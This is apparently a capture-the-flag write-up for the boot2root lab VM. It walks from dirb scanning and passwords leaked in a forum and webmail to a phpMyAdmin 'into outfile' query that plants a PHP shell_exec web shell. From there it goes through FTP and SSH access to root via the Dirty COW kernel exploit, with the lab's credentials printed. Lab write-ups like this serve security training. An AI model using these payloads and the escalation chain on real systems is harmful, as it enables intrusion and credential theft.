-------------------------------------------------------------------------------

# The following method describes a Race Condition Privilege Escalation

-------------------------------------------------------------------------------

## First we need to find the IP address of the VM

* Refer to writeup1

## Secondly we are looking for credentials.

* We use a software call Drib to scrap some of the most common url of the website.

```
git clone https://github.com/v0re/dirb.git
./dirb https://[YOUR IP]/ wordlists/common.txt

---- Scanning URL: https://10.12.1.150/ ----
+ https://10.12.1.150/cgi-bin/ (CODE:403|SIZE:288)
==> DIRECTORY: https://10.12.1.150/forum/
==> DIRECTORY: https://10.12.1.150/phpmyadmin/
+ https://10.12.1.150/server-status (CODE:403|SIZE:293)
==> DIRECTORY: https://10.12.1.150/webmail/
```
### Forum

* After sneaking around and read all the forum post, we find a clue on the post "Probleme login ?" url = https://10.12.1.150/forum/index.php?id=6

* If your look for ```Failed password``` your will find one where the user is ``` !q\]Ej?*5K5cy*AJ``` and we think that the user who tried to login make a mistake between are password and login

![alt text](https://github.com/fhenri42/boot2root/blob/master/Ressources/Screen%20Shot%202018-03-05%20at%2010.05.14%20AM.png)

* The post was made by lmezard (Laurie Mezard)

* Conclution we have one of the password of lmezard.

### Webmail

* On the webmail we have a login form, and we just find a password in the forum section so we decided to give it a try.

![alt text](https://github.com/fhenri42/boot2root/blob/master/Ressources/Screen%20Shot%202018-03-05%20at%2010.04.21%20AM.png)

* After several attempts the combination was
* Login: ```laurie@borntosec.net```
* Password: ```!q\]Ej?*5K5cy*AJ```

* When we logged in , we find a email with the subject ```DB Access```


![alt text](https://github.com/fhenri42/boot2root/blob/master/Ressources/Screen%20Shot%202018-03-05%20at%2010.06.32%20AM.png)

* Login: ```root```
* Password: ```Fg-'kKXBj87E:aJ$```
* we really suspect in the access for a DB

### Phpmyadmin

* We tried the credentials of the email to login phpmyadmin and it worcks :)
* After some research on the web we stumble on this [aritcle](http://www.informit.com/articles/article.aspx?p=1407358&seqNum=2)
* The injection sql we are looking for is:
```select "<?php $output = shell_exec('cat /home/LOOKATME/password'); echo $output  ?>" into outfile "/var/www/forum/templates_c/endTest0.php"```
* Copy past this line and go to to => https://10.12.1.150/phpmyadmin/index.php on the sql tab
* After this step your just need to go to https://10.12.1.150/forum/templates_c/endTest0.php
* You will find ```lmezard:G!@M6f4Eatau{sF"```
* Login: ```lmezard```
* Password: ```G!@M6f4Eatau{sF"```

## Use the credentials

* Now we got the password of the server, we can try to log on the FTP service
* ftp [YOUR-IP-ADDRESS]
* login with  ```lmezard``` ```G!@M6f4Eatau{sF"```
* get the fun file, see example bellow:

```bash
ftp> ls
229 Entering Extended Passive Mode (|||25027|).
150 Here comes the directory listing.
-rwxr-x---    1 1001     1001           96 Oct 15  2015 README
-rwxr-x---    1 1001     1001       808960 Oct 08  2015 fun
226 Directory send OK.
ftp> get fun
local: fun remote: fun
229 Entering Extended Passive Mode (|||7488|).
150 Opening BINARY mode data connection for fun (808960 bytes).
100% |****************************************************************************************************************************************|   790 KiB  127.07 MiB/s    00:00 ETA
226 Transfer complete.
808960 bytes received in 00:00 (120.03 MiB/s)
ftp> ls
229 Entering Extended Passive Mode (|||44244|).
150 Here comes the directory listing.
-rwxr-x---    1 1001     1001           96 Oct 15  2015 README
-rwxr-x---    1 1001     1001       808960 Oct 08  2015 fun
226 Directory send OK.
ftp>
```

## Using the fun file

* Refer to writeup1, step 2
* ssh login: laurie / 330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4

## ssh connection
* use  ``ssh laurie@10.12.1.150`` add the password when it's ask

## Race Condition Privilege Escalation
* YES!!!! we are on the serveur ! know we need to get information about the os
* kernel verions : ```uname -r``` => 3.2.0-91-generic-pae
* Distrubition name and verisons ```cat /etc/*-release``` => Ubuntu, 12.04

* After having information on what we where working on we did some research on [EXPLOIT DATABASE](https://www.exploit-db.com)
* We find the "Linux Kernel 2.6.22 < 3.9 - 'Dirty COW' 'PTRACE_POKEDATA' Race Condition Privilege Escalation (/etc/passwd Method)"
* go to https://www.exploit-db.com/exploits/40839/ and Copy the script
* ```gcc -pthread dirty.c -o dirty -lcrypt && ./dirty```
* add a password, example: 12345
* ```su firefart``` use your password

# GG Your root !
